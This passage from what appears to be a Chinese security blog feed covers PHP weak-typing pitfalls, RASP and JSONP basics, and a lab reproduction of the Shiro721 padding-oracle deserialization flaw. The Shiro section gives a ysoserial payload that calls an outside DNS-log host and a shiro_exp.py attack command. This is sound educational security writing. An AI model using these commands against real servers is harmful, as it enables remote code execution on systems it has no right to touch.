title="十六进制转换"></a>十六进制转换</h4><ul><li>当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;0x1e240&quot;==&quot;123456&quot;//true</span><br><span class="line">&quot;0x1e240&quot;==123456//true</span><br><span class="line">&quot;0x1e240&quot;==&quot;1e240&quot;//false</span><br></pre></td></tr></table></figure><h3 id="类型转换-1"><a href="#类型转换-1" class="headerlink" title="类型转换"></a>类型转换</h3><p>常见的转换主要就是int转换为string，string转换为int。<br>int转string：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$var = 5;</span><br><span class="line">方式1：$item = (string)$var;</span><br><span class="line">方式2：$item = strval($var);</span><br></pre></td></tr></table></figure><p>string转int：intval()函数。<br>对于这个函数，可以先看2个例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(&#x27;2&#x27;))//2</span><br><span class="line">var_dump(intval(&#x27;3abcd&#x27;))//3</span><br><span class="line">var_dump(intval(&#x27;abcd&#x27;))//0</span><br></pre></td></tr></table></figure><p>说明intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。<br>intval()的这种特性在攻防平台中的<strong>MYSQL</strong>这道题目中就有考到。<br>同时，程序员在编程的时候也不应该使用如下的这段代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(intval($a)&gt;1000) &#123;</span><br><span class="line">    mysql_query(&quot;select * from news where id=&quot;.$a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候$a的值有可能是1002 union…..</p><h2 id="内置函数的参数的松散性"><a href="#内置函数的参数的松散性" class="headerlink" title="内置函数的参数的松散性"></a>内置函数的参数的松散性</h2><p>​内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。</p><h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><ul><li>当传递一个array时，md5()不会报错，知识会无法正确地求出array的md5值，这样就会导致任意2个array的md5值都会相等。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$array1[] = array(</span><br><span class="line">    &quot;foo&quot; =&gt; &quot;bar&quot;,</span><br><span class="line">    &quot;bar&quot; =&gt; &quot;foo&quot;,</span><br><span class="line">);</span><br><span class="line">$array2 = array(&quot;foo&quot;, &quot;bar&quot;, &quot;hello&quot;, &quot;world&quot;);</span><br><span class="line">var_dump(md5($array1)==var_dump($array2));//true</span><br></pre></td></tr></table></figure><p>PHP手册中的md5()函数的描述是<code>string md5 ( string $str [, bool $raw_output = false ] )</code>，md5()中的需要是一个string类型的参数。</p><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>strcmp()函数在PHP官方手册中的描述是<code>int strcmp ( string $str1 , string $str2 )</code>,需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。<br>如果传入给出strcmp()的参数是数字呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$array=[1,2,3];</span><br><span class="line">var_dump(strcmp($array,&#x27;123&#x27;)); //null,在某种意义上null也就是相当于false。</span><br></pre></td></tr></table></figure><h4 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h4><p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$i =&quot;2abc&quot;;</span><br><span class="line">switch ($i) &#123;</span><br><span class="line">case 0:</span><br><span class="line">case 1:</span><br><span class="line">case 2:</span><br><span class="line">    echo &quot;i is less than 3 but not negative&quot;;</span><br><span class="line">    break;</span><br><span class="line">case 3:</span><br><span class="line">    echo &quot;i is 3&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候程序输出的是<code>i is less than 3 but not negative</code>，是由于switch()函数将$i进行了类型转换，转换结果为2。</p><h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h4><p>在PHP手册中，in_array()函数的解释是<code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code>,如果strict参数没有提供，那么in_array就会使用松散比较来判断$needle是否在$haystack中。当strince的值为true时，in_array()会比较needls的类型和haystack中的类型是否相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$array=[0,1,2,&#x27;3&#x27;];</span><br><span class="line">var_dump(in_array(&#x27;abc&#x27;, $array));  //true</span><br><span class="line">var_dump(in_array(&#x27;1bc&#x27;, $array));//true</span><br></pre></td></tr></table></figure><p>可以看到上面的情况返回的都是true,因为’abc’会转换为0，’1bc’转换为1。<br>array_search()与in_array()也是一样的问题。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.spoock.com/2016/06/25/weakly-typed-security/">PHP弱类型安全问题总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP弱类型简介&quot;&gt;&lt;a href=&quot;#PHP弱类型简介&quot; class=&quot;headerlink&quot; title=&quot;PHP弱类型简介&quot;&gt;&lt;/a&gt;PHP弱类型简介&lt;/h2&gt;&lt;p&gt;​		PHP属于弱类型语言，PHP不必声明该变量的数据类型，PHP会根据变量的值自动把变量的</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>深入理解Shiro721（Apache Shiro RememberMe Padding Oracle 漏洞）</title>
    <link href="https://yinwc.github.io/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://yinwc.github.io/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-06-16T10:00:54.000Z</published>
    <updated>2023-02-02T05:56:28.482Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4">漏洞复现步骤</a></li><li><a href="#%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86">密码学知识</a><ul><li><a href="#aes%E7%AE%97%E6%B3%95">AES算法</a></li><li><a href="#%E5%AF%86%E7%A0%81%E5%AD%A6%E4%BD%93%E5%88%B6%E4%BB%8B%E7%BB%8D">密码学体制介绍</a></li><li><a href="#cbc%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F">CBC加密模式</a></li><li><a href="#padding-%E5%A1%AB%E5%85%85%E6%9C%BA%E5%88%B6">Padding 填充机制</a></li><li><a href="#padding-oracle-attack-%E5%A1%AB%E5%85%85-oracle-%E6%94%BB%E5%87%BB">Padding Oracle Attack 填充 Oracle 攻击</a></li><li><a href="#cbc-byte-flipping-attack-cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB">CBC Byte-Flipping Attack CBC字节翻转攻击</a></li></ul></li></ul></li><li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro RememberMe Cookie默认通过<code>AES-128-CBC</code>模式加密，这种加密方式容易受到<code>Padding Oracle Attack（Oracle填充攻击）</code>，利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击.</p><ul><li>AES 是指 “高级加密标准”，是一种对称加密的分组加密算法，128是指密钥长度,CBC是指 “密码分组链接” 加密模式 , PKCS5Padding 是 Apache Shiro 中默认填充方式 , 最后一个明文分组缺少 N 个字节,则填充N个0x0N。</li><li>在 Apache Shiro 中默认使用 CBC 加密模式与 PKCS5Padding 填充方式，CBC 加密模式容易遭到 Padding Oracle Attack，攻击者可以通过枚举 IV 的方式计算出全部明文，并且可以通过 CBC Byte-Flipping Attack 篡改某一段的明文。</li><li>Padding Oracle Attack 利用前提 :<br>1、攻击者能够获得密文( CipherText )与附带在密文前面的初始化向量( IV )<br>2、服务端对密文解密后会判断 Padding 是否有效 . 并根据不同的判定结果返回不同的响应信息。</li><li>CBC Byte-Flipping Attack 利用前提 :<br>1、明文和密文已知</li></ul><h3 id="漏洞复现步骤"><a href="#漏洞复现步骤" class="headerlink" title="漏洞复现步骤"></a>漏洞复现步骤</h3><p>1、登录网站并且获取 RememberMe Cookie 值<br>2、使用 RememberMe Cookie 值来作为 Padding Oracle Attack 的前缀<br>3、通过 Padding Oracle Attack 的攻击方式精心构造可利用的 <code>YSoSerial</code> 反序列化数据<br>4、将构造好的反序列化数据填充到 RememberMe Cookie 字段中并发送 , 即可在目标服务器上执行任意代码.</p><h3 id="密码学知识"><a href="#密码学知识" class="headerlink" title="密码学知识"></a>密码学知识</h3><h4 id="AES算法"><a href="#AES算法" class="headerlink" title="AES算法"></a>AES算法</h4><p><code>Apache Shiro</code> 中使用的AES(高级加密标准)加密算法，就是一种对称加密的分组加密算法。</p><p>加解密密钥的长度：一般为128 bits , 即 16 Bytes</p><p>分组加密的加密模式：CBC加密模式</p><p>加密模式对应的填充方式：Padding填充机制</p><h4 id="密码学体制介绍"><a href="#密码学体制介绍" class="headerlink" title="密码学体制介绍"></a>密码学体制介绍</h4><p>1、按照密钥特征的不同划分，密码体制可以分为两类 : “对称加密” 和 “非对称加密”</p><blockquote><p>对称加密 : 加密 , 解密过程使用的密钥相同(AES、DES等)<br>非对称加密 : 加密 , 解密过程使用不同的密钥(RSA、DSA)</p></blockquote><p>2、按照加密方式的不同,密码体制可以分为两类:”分组密码( 块密码 )” 和 “流密码( 序列密码 )”</p><ul><li><p>分组密码( 块密码 ) : 当加密明文时 , 会先将明文编码表示为二进制序列( 明文流 ) , 然后将其分为若干个固定长度的组 , 最后分别对每个组进行加密 , 生成密文流.</p><ul><li><p>分组加密算法中有 5 种可选的加密变换方式( 加密模式 )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ECS ( Electronic Codebook Book , 电话本模式 )</span><br><span class="line">CBC ( Cipher Block Chaining , 密码分组链接模式 )</span><br><span class="line">CTR ( Counter , 计算器模式 )</span><br><span class="line">CFB ( Cipher FeedBack , 密码反馈模式 )</span><br><span class="line">OFB ( Output FeedBack , 输出反馈模式 )</span><br></pre></td></tr></table></figure></li></ul></li><li><p>流密码( 序列密码 ) : 当加密明文时 , 会先将明文编码表示为二进制序列( 明文流 ) , 然后由种子密钥生成一个密钥流 , 最后利用加密算法把明文流和密钥流加密，生成密文流.</p></li></ul><h4 id="CBC加密模式"><a href="#CBC加密模式" class="headerlink" title="CBC加密模式"></a>CBC加密模式</h4><p>将明文切分成若干小段,然后每一段分别与上一段的密文进行异或运算,再与密钥进行加密，生成本段明文的密文,这段密文用于下一段明文的加密。</p><p>第一段明文没有对应的密文,为了确保分组的唯一性,CBC 加密模式使用了初始化向量(IV , Initialization Vector)。初始化向量是一个固定长度的随机数,该向量会作为密文第一个块,随密文一同传输。</p><p>在 CBC 模式中,初始化向量(IV)的长度与分组大小相同，为 16 Bytes(128 bits),因为链接模式中的异或操作是等长操作。</p><h4 id="Padding-填充机制"><a href="#Padding-填充机制" class="headerlink" title="Padding 填充机制"></a>Padding 填充机制</h4><p>Padding填充机制是加密模式下的填充方式，分组加密时，会把明文切割成多个分组，”Padding” 用于在最后一个分组的结尾填充一些额外的 bits , 使分组成为标准的 16 Bytes</p><p>CBC 加密模式下可用的Padding方式有 3 个 :</p><ul><li>1、AES&#x2F;CBC&#x2F;NoPadding : 明文长度必须是 8 Bytes 的倍数 , 否则会报错 .</li><li>2、AES&#x2F;CBC&#x2F;PKCS5Padding : 以完整字节填充 , 每个填充字节的值是用于填充的字节数 . 即要填充 N 个字节 , 每个字节都为 N.<br>举例 : 使用 PKCS5Padding 方式填充 3 个字节 : | AA BB CC DD EE 03 03 03 |</li><li>3、AES&#x2F;CBC&#x2F;ISO10126Padding : 以随机字节填充 , 最后一个字节为填充字节的个数 .<br>举例 : 使用 ISO10126Padding 方式填充 5 个字节 : | AA BB CC A9 3B 78 04 05 |</li></ul><p>在 Apache Shiro中，使用的是PKCS5Padding方式。</p><h4 id="Padding-Oracle-Attack-填充-Oracle-攻击"><a href="#Padding-Oracle-Attack-填充-Oracle-攻击" class="headerlink" title="Padding Oracle Attack( 填充 Oracle 攻击 )"></a>Padding Oracle Attack( 填充 Oracle 攻击 )</h4><p>Padding Oracle Attack是一种针对CBC模式分组加密算法的攻击。它可以在不知道密钥（key）的情况下，通过对padding bytes的尝试，还原明文，或者构造出任意明文的密文。</p><p><a href="https://yinwc.github.io/2018/07/30/Padding-Oracle-Attack/#Pading-Oracle-Attack%E6%94%BB%E5%87%BB">之前的文章:Padding Oracle Attack</a></p><p>这里的 Oracle 与甲骨文公司没有任何关系。Padding Oracle Attack 也不是针对某一种分组加密算法的攻击,而是针对 CBC加密模式的。</p><p>密码学中的 Oracle 是一种通过接收特定加密数据，解密并验证填充是否正确的方式。</p><h4 id="CBC-Byte-Flipping-Attack-CBC字节翻转攻击"><a href="#CBC-Byte-Flipping-Attack-CBC字节翻转攻击" class="headerlink" title="CBC Byte-Flipping Attack (CBC字节翻转攻击)"></a>CBC Byte-Flipping Attack (CBC字节翻转攻击)</h4><p>通过Padding Oracle Attack可以在不知道密钥(key)的情况下，获取全部明文的值。<br>通过CBC Byte-Flipping Attack（CBC字节翻转攻击） 可以实现对明文的篡改。</p><p>CBC字节翻转攻击的原理 : 通过损坏密文字节来改变明文字节 。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>复现环境： JDK1.8 + Tomcat8 + Shiro-1.4.1 .<br>首先从 Github 上下载一份 Shrio 源码 , 并切换到存在漏洞的分支( 1.4.1 )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.4.1</span><br></pre></td></tr></table></figure><p>启动IDEA，配置tomcat（别用最新的版本的tomcat，容易出错）<br>并设置 samples-web:war 作为 Artifacts<br>然后启动tomcat</p><p><img src="/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="shiro721漏洞复现"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1、首先通过 YSoSerial 生成可利用的 Payload . 由于之前配置 pom.xml 时没有添加任何组件 , 所以使用 URLDNS Payload 来探测漏洞是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 &quot;ping milon0.ceye.io&quot; &gt; payload.class</span><br></pre></td></tr></table></figure><p>2、获取一个有效的Remember Cookie</p><p>[<img src="/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="shiro721漏洞复现"></p><p>[<img src="/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="shiro721漏洞复现"></p><p>此处注意删除JSESSIONID，否则后续无法利用</p><p>3、通过 Padding Oracle Attack 生成 Evil Rememberme cookie:<br>注意：此exp爆破时间较长，建议使用 <code>ysoserial</code> 生成较短的 payload 验证（eg: ping 、 touch &#x2F;tmp&#x2F;success, etc），约 1 个多小时可生成正确的 rememberme cookie，生成成功后将自动停止运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exp.py</span><br><span class="line">Usage: shiro_exp.py &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;</span><br><span class="line">python shiro_exp.py http://localhost:8080/samples_web_war/home.jsp xSEnrD1VPnQ49Tke8d9s7yXyBdKmcZTvF5KZ+8trI5/CQNSwsTJPlfBIEWj4ewouARb8LY4n1BQClrG6+Y5NsyyRhJwjbMKP9DenW7Dd78k9xeWfQZStuyyVsPG3Yq+fAgisJZ706Nzl0Sc2BsoA4COM2Frj5H4Tu3XQr3yer4lQawGdQPT8UCj4XqzuU9xgmmAWzlfEBe0f217/rhFF0dtLogcX7Jw1E0Q5xnoiiEf1Q76ynr/wKb74FqS0UfCHj67lE7yYYd1cjRw4IuM2c/JGppP5rMbuq7Nb5D/UrkMv/Cqv777YbQx90QjGw50v13NPjfoki6lgqwaI+woUh4thZQM6mHHTvE+A2S/a1sNJhYodne/9BQx5iONqjICnGRC5om9IG9XAm+lJ6ED6P1xxSqFNiXWh7JqCFk7YeEwpZoqLYR8EYq+uxqyOwsagOQSYnHVIzNkIcuNcvjBkDtRf37+T/0n0yz/8I3gYL+sV4eOh5ITXpKHTKdprKof4 payload.class</span><br></pre></td></tr></table></figure><p>4、使用Evil Rememberme cookie 认证进行反序列化攻击，即可在dnslog平台获取记录。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[CVE-2019-12422 Shiro721 分析<a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/"> 上 ]</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86&quot;&gt;基础知识&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>理解RASP技术</title>
    <link href="https://yinwc.github.io/2021/05/21/%E7%90%86%E8%A7%A3RASP%E6%8A%80%E6%9C%AF/"/>
    <id>https://yinwc.github.io/2021/05/21/%E7%90%86%E8%A7%A3RASP%E6%8A%80%E6%9C%AF/</id>
    <published>2021-05-21T09:53:09.000Z</published>
    <updated>2023-01-28T10:00:01.361Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFrasp">什么是RASP？</a><ul><li><a href="#rasp-vs-waf">RASP vs WAF</a></li></ul></li><li><a href="#php-rasp%E5%AE%9E%E7%8E%B0">PHP-RASP实现</a><ul><li><a href="#php%E6%89%A9%E5%B1%95">php扩展</a></li><li><a href="#php%E4%B8%AD%E7%9A%84rasp%E5%AE%9E%E7%8E%B0">php中的rasp实现</a></li></ul></li><li><a href="#java-rasp%E5%AE%9E%E7%8E%B0">JAVA-RASP实现</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="什么是RASP？"><a href="#什么是RASP？" class="headerlink" title="什么是RASP？"></a>什么是RASP？</h2><ul><li><p>RASP：Runtime application self-protection（运行时自我保护）</p></li><li><p>RASP是一种应用安全保护技术，在运行时检测攻击并且进行自我保护。它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。</p></li><li><p>RASP在后端代码运行时做安全监测，但又不侵入后端代码，就得切入Web后端解释器。<br>以Java为例，Java支持以JavaAgent的方式，在class文件加载时修改字节码，在关键位置插入安全检查代码，实现RASP功能。</p><ul><li>同样，PHP也支持对PHP内核做类似的操作，PHP支持PHP扩展，实现这方面的需求。</li></ul></li></ul><h3 id="RASP-vs-WAF"><a href="#RASP-vs-WAF" class="headerlink" title="RASP vs WAF"></a>RASP vs WAF</h3><ul><li>WAF主要通过分析流量中的特征过滤攻击请求，并拦截携带有攻击特征的请求。WAF虽可有效过滤出绝大多数恶意请求，但是不知道应用运行时的上下文，必然会造成一定程度的误报。并且WAF严重依赖于特征库，各种花式绕过，导致特征编写很难以不变应万变。</li><li>RASP的不同就在于运行在应用之中，与应用融为一体，可以获取到应用运行时的上下文，根据运行时上下文或者敏感操作，对攻击进行精准的识别或拦截。于此同时，由于RASP运行在应用之中，只要检测点选取合理，获取到的payload已经是解码过的真实payload，可以减少由于WAF规则的不完善导致的漏报。</li><li>WAF作为应用外围的防线，RASP作为应用自身的安全防护，确保对攻击的有效拦截。RASP带来的性能消耗在5%~10%之间，在一定程度上仍然是可以接受的。由于RASP需要运行在应用中，不能像WAF一样在流量入口统一部署。需要根据应用开发的技术不同使用不同的RASP。比如.net应用与Java应用需要不同的RASP产品，增加了部署成本。</li></ul><h2 id="PHP-RASP实现"><a href="#PHP-RASP实现" class="headerlink" title="PHP-RASP实现"></a>PHP-RASP实现</h2><h3 id="php扩展"><a href="#php扩展" class="headerlink" title="php扩展"></a>php扩展</h3><p>PHP核心由两部分组成，一部分是PHP core，主要负责请求管理，文件和网络操作，另一部分是Zend引擎，Zend引擎负责编译和执行，以及内存资源的分配。</p><h3 id="php中的rasp实现"><a href="#php中的rasp实现" class="headerlink" title="php中的rasp实现"></a>php中的rasp实现</h3><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/166">TRASP的实现</a></p><p>PHP RASP作为PHP解释器的扩展，是一个动态库so文件，PHP语言中类似的动态库很多，比如：mysql.so，RASP和MYSQL扩展的加载方式和运行原理一样，集成在PHP解释器中。</p><p>三个步骤来实现PHP RASP扩展模块：<br>1、预加载<br>任何一个PHP实例都会经过Module init、Request init、Request shutdown和Module shutdown四个过程。</p><p>2、Hook Opcode 或 Hook 内部函数<br>RASP需要监控各个敏感函数的调用，在PHP中比较好的方式便是 Hook Opcode 和 Hook内部函数。</p><p>3、参数获取与分析<br>在完成对敏感函数调用行为的监控后，通过ZEND_CALL_NUM_ARGS和ZEND_CALL_ARG可以获取到函数的参数个数和内容，便可根据函数的参数制定相应的策略。如文件类可以关注是否读取了敏感文件, 数据库操作类是否语法结构发生了变化等等。</p><h2 id="JAVA-RASP实现"><a href="#JAVA-RASP实现" class="headerlink" title="JAVA-RASP实现"></a>JAVA-RASP实现</h2><p>Java RASP 实现的基本思路类似于 Java 中的 AOP 技术（AOP：面向切面编程），将 RASP 的 Hook 代码注入到需要进行检测的地方，根据上下文和关键函数的参数等信息判断请求是否为恶意请求，并终止或继续执行流。</p><p><a href="https://blog.didiyun.com/index.php/2019/01/10/java-rasp/">浅析基于 Java 的 RASP 实现</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://security.tencent.com/index.php/blog/msg/166">腾讯：RASP攻防 —— RASP安全应用与局限性浅析</a><br><a href="https://xz.aliyun.com/t/7316">从0开始的PHP RASP的学习</a><br><a href="https://c0d3p1ut0s.github.io/%E4%B8%80%E7%B1%BBPHP-RASP%E7%9A%84%E5%AE%9E%E7%8E%B0/">一类PHP RASP的实现</a><br><a href="https://github.com/laruence/taint">鸟哥：taint</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%80%E4%B9%88%E6%98%AFrasp&quot;&gt;什么是RASP？&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#rasp-vs-waf&quot;&gt;RASP vs WAF&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/l</summary>
      
    
    
    
    
    <category term="安全开发" scheme="https://yinwc.github.io/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>深入理解JSONP漏洞</title>
    <link href="https://yinwc.github.io/2021/04/30/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JSONP%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yinwc.github.io/2021/04/30/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JSONP%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-30T09:49:34.000Z</published>
    <updated>2023-02-15T05:42:01.449Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">漏洞危害及利用方式</a><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">漏洞利用方式</a></li></ul></li><li><a href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95">漏洞测试</a></li><li><a href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88">修复方案</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li><p>JSONP是JSON with padding（填充式JSON或参数式JSON）的简写。</p></li><li><p>JSONP是为了解决跨域资源请求而产生的一种解决方案，动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的<code>src</code>不受同源策略约束来跨域获取数据。</p></li><li><p>JSONP由两部~分组成：<code>回调函数</code>和<code>数据</code></p><ul><li>回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</li></ul></li><li><p>对同源策略免疫的标签：<code>&lt;img&gt;</code> 的<code>src</code>、<code>&lt;link&gt;</code> 的 <code>href</code>、<code>&lt;script&gt;</code>的 <code>src</code></p></li><li><p>JSONP就是利用<code>script</code>标签的<code>src</code>属性实现跨区域请求的<br>JSONP的过程：幼稚园吃午饭，小明吧贴有自己名字的碗（回调函数）给了幼稚园阿姨（服务器）,阿姨给小明盛好饭（json参数）以后又把碗还给了小明。<br>动态创建<code>&lt;script&gt;</code>标签，设置其src，回调函数在src中设置：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var script = document.createElement(&quot;script&quot;);</span><br><span class="line">script.src = &quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;;</span><br><span class="line">document.body.insertBefore(script, document.body.firstChild);</span><br></pre></td></tr></table></figure><p>在页面中，返回的JSON作为response参数传入回调函数中，通过回调函数来来操作数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function handleResponse(response)&#123;</span><br><span class="line">    // 对response数据进行操作代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞危害及利用方式"><a href="#漏洞危害及利用方式" class="headerlink" 